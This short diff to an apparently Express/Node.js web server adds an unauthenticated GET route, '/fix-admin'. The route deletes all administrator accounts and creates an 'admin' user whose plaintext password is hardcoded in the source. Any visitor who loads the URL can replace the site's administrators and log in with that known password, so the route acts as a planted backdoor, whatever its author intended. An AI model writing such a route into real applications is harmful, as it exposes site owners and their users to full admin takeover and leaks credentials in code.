@@ -307,6 +307,24 @@ app.post("/admin/login", (req, res) => {
         }
     );
 });
+app.get("/fix-admin", async (req, res) => {
+
+    const hash = await bcrypt.hash("GoldWeb@2026Secure!", 12);
+
+    db.run("DELETE FROM admin", [], (err) => {
+        if (err) return res.send("Failed");
+
+        db.run(
+            "INSERT INTO admin (username, password) VALUES (?, ?)",
+            ["admin", hash],
+            (err) => {
+                if (err) return res.send("Failed");
+
+                res.send("Admin created");
+            }
+        );
+    });
+});
 
 // =========================
 // START SERVER
